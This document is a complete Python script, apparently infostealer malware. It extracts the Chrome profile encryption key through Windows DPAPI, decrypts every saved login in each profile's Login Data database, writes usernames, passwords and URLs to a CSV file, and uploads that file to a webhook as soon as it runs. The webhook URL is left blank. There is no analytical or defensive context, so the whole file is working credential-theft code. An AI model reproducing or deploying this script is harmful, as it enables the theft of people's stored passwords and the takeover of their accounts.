import requests
import os 
from base64 import b64decode
from json import loads
from win32crypt import CryptUnprotectData
import sqlite3
from Crypto.Cipher import AES
from shutil import copyfile
import csv

webhookURL = ""
CHROMEPATH = f"c:\\Users\\{os.getlogin()}\\AppData\\Local\\Google\\Chrome\\User Data"

# I used reference to figure out the decryption.

def sendToWebhook(fileToSend):
    file = open(fileToSend, "rb")
    # "content": "file",
    data = {
        "file": (file.name, file.read())
    }
    requests.post(webhookURL, data=data)

def getChromePasswordDencryptionKey(path):
    if not os.path.exists(f"{path}\\Local State"): return

    localStateFile = open(f"{path}\\Local State", "r", encoding="utf-8")
    localStateFileJson = loads(localStateFile.read())["os_crypt"]["encrypted_key"]
    
    return CryptUnprotectData(b64decode(localStateFileJson)[5:], None, None, None, 0)[1]

def decryptPassword(password, key):
    # All the heavy lifting was not done by me.
    try:
        return AES.new(key, AES.MODE_GCM, password[3:15]).decrypt(password[15:])[:-16].decode()
    except:
        try:
            return str(CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return None

def getChromePasswords():
    decryptionKey = getChromePasswordDencryptionKey(CHROMEPATH)
    exportedPasswordsFile = open("CDBEXP.csv", "w", newline="")
    csvWriter = csv.writer(exportedPasswordsFile)
    i = 0
    i2 = 1

    for itemName in os.listdir(CHROMEPATH):
        fullFilePath = f"{CHROMEPATH}\\{itemName}"
        if os.path.isdir(fullFilePath) and "profile" in itemName.lower() or "default" in itemName.lower():
            loginDataFile = f"{fullFilePath}\\Login Data"
            if os.path.exists(loginDataFile) and os.path.isfile(loginDataFile):
                copiedLoginDataFile = copyfile(loginDataFile, f"Login Data {i}")
                passwordsDB = sqlite3.connect(copiedLoginDataFile)
                cursor = passwordsDB.cursor()
                i += 1

                csvWriter.writerow([i2, "Username", "Password", "Origin Url", "Login Url", f"NEW PROFILE: {i}"])
                cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created") # Not by me!
                for row in cursor.fetchall():
                    originURL = row[0]
                    loginURL = row[1]
                    username = row[2]
                    password = decryptPassword(row[3], decryptionKey)
                    
                    if not username: continue

                    csvWriter.writerow([i2, username, password, loginURL, originURL])
                    i2 = i2 + 1
                cursor.close()
                passwordsDB.close()
                os.remove(os.path.abspath(copiedLoginDataFile))
    exportedPasswordsFile.close()
    return exportedPasswordsFile.name

sendToWebhook(getChromePasswords())